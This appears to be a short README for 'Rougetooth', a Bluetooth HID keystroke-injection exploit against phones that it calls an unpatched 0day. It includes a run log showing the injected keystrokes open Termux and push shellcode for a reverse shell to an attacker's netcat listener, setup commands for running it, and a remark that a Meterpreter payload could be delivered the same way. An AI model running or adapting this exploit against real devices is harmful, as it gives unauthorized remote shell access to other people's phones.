**Rougetooth Bluetooth HID injection attack**

*This is 0day as of Apr 21, 2023*

```
[*] Reverse shell built for 10.0.2.2 on 6543
[*] Pairing to 08:AE:D6:6F:DD:F8
[!] Paired 08:AE:D6:6F:DD:F8 to DC:53:60:6C:FC:B3
[*] Prepped to send HID shellcode, using finder to find termux, then termux to pop a reverse shell from 08:AE:D6:6F:DD:F8...
[!] Go to another terminal and start a netcat listener on port 6543 to handle the shell!
[*] Registered HID profile
[!] Ready, waiting for connection from phone
[*] Control channel connected to 08:AE:D6:6F:DD:F8
[*] Interrupt channel connected to 08:AE:D6:6F:DD:F8
[*] Trying to attain control over device...
[*] Sending back to home screen
[*] Trying to pull up finder...
[*] Trying to find termux...
[*] Pushing shellcode now...
[!] Check your netcat listener for a shell!
[!] Exploit finished.
```



*setup*

Need to run `sudo systemctl stop bluetooth`, then run: `bluetoothd -P input`.

Now pair the device, and: `sudo ./run.sh`.  Now on the phone, tap on the computer's controller alias in the bluetooth screen, and the exploit should proceed.

It should try to push the file, then accept the file itself by bringing up a HID controller on the computer side, and emulating the keypresses needed
from a hardware keyboard to accept the transfer.  This is a benign proof of concept, but uploading a meterpreter shell and running it this way is possible.


*Tested on: linux kernel 6.1.12, bluetoothd 5.66, python libraries: python-xlib 0.27, dbus-python 1.2.16*

Have fun, and be safe!

 
